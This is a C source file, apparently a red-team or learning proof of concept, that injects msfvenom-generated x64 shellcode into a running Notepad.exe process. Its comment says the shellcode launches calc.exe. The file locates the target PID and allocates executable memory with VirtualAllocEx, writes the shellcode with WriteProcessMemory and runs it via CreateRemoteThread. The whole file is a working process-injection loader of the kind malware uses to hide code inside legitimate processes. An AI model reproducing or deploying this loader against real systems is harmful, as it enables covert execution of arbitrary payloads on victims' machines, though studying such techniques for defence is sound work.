#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>

/* 
 - msfvenom -a x64 --platform Windows -p windows/x64/exec cmd="cmd.exe /c calc.exe" -b '\x00' -f c EXITFUNC=thread --var-name=buf
 */ 
const unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xdc\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xb6\xe6\xca\x47\x73\x13\x4d\x74\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4a\xae\x49"
"\xa3\x83\xfb\x8d\x74\xb6\xe6\x8b\x16\x32\x43\x1f\x25\xe0"
"\xae\xfb\x95\x16\x5b\xc6\x26\xd6\xae\x41\x15\x6b\x5b\xc6"
"\x26\x96\xae\x41\x35\x23\x5b\x42\xc3\xfc\xac\x87\x76\xba"
"\x5b\x7c\xb4\x1a\xda\xab\x3b\x71\x3f\x6d\x35\x77\x2f\xc7"
"\x06\x72\xd2\xaf\x99\xe4\xa7\x9b\x0f\xf8\x41\x6d\xff\xf4"
"\xda\x82\x46\xa3\x98\xcd\xfc\xb6\xe6\xca\x0f\xf6\xd3\x39"
"\x13\xfe\xe7\x1a\x17\xf8\x5b\x55\x30\x3d\xa6\xea\x0e\x72"
"\xc3\xae\x22\xfe\x19\x03\x06\xf8\x27\xc5\x3c\xb7\x30\x87"
"\x76\xba\x5b\x7c\xb4\x1a\xa7\x0b\x8e\x7e\x52\x4c\xb5\x8e"
"\x06\xbf\xb6\x3f\x10\x01\x50\xbe\xa3\xf3\x96\x06\xcb\x15"
"\x30\x3d\xa6\xee\x0e\x72\xc3\x2b\x35\x3d\xea\x82\x03\xf8"
"\x53\x51\x3d\xb7\x36\x8b\xcc\x77\x9b\x05\x75\x66\xa7\x92"
"\x06\x2b\x4d\x14\x2e\xf7\xbe\x8b\x1e\x32\x49\x05\xf7\x5a"
"\xc6\x8b\x15\x8c\xf3\x15\x35\xef\xbc\x82\xcc\x61\xfa\x1a"
"\x8b\x49\x19\x97\x0f\xc9\x12\x4d\x74\xb6\xe6\xca\x47\x73"
"\x5b\xc0\xf9\xb7\xe7\xca\x47\x32\xa9\x7c\xff\xd9\x61\x35"
"\x92\xc8\xf3\x50\x5e\xbc\xa7\x70\xe1\xe6\xae\xd0\x8b\x63"
"\xae\x49\x83\x5b\x2f\x4b\x08\xbc\x66\x31\xa7\x06\x16\xf6"
"\x33\xa5\x94\xa5\x2d\x73\x4a\x0c\xfd\x6c\x19\x1f\x24\x1e"
"\x77\x63\x11\xce\x83\xea\x68\x10\x33\x2e\x15\xda\x85\xe4"
"\x22\x0b\x76\x4d\x74";

SIZE_T ShellcodeSize = sizeof(buf);

DWORD find_pid(const char* process_name){
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (strcmp(pe.szExeFile, process_name) == 0) {
            printf("[+] Found process %s with PID: %d\n", process_name, pe.th32ProcessID);
            CloseHandle(snapshot);
            return pe.th32ProcessID;
        }
    } while (Process32Next(snapshot, &pe));
    printf("[-] Process not found\n");
    CloseHandle(snapshot);
    return 0;
}

int main(void){
    HANDLE open = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        find_pid("Notepad.exe")
    );
    if ( open == NULL){
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        CloseHandle(open);
        return EXIT_FAILURE;
    }
    printf("[+] OpenProcess success: %p\n", open);

    LPVOID addr = VirtualAllocEx(
        open,
        NULL,
        ShellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if ( addr == NULL){
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        CloseHandle(open);  
        return EXIT_FAILURE;
    }
    printf("[+] VirtualAlloc success: %p\n", addr);

    BOOL write = WriteProcessMemory(
        open,
        addr,
        buf,
        sizeof(buf),
        NULL
    );
    printf("[+] WriteProcessMemory success: %d\n", write);

    HANDLE thread = CreateRemoteThread(
        open,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)addr,
        NULL,
        0,
        NULL
    );
    if ( thread == NULL){
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        CloseHandle(open);  
        return EXIT_FAILURE;
    }
    printf("[+] CreateRemoteThread success: %p\n", thread);

    WaitForSingleObject(thread, 0xFFFFFFFF);
    CloseHandle(thread);
    CloseHandle(open);
    return EXIT_SUCCESS;
}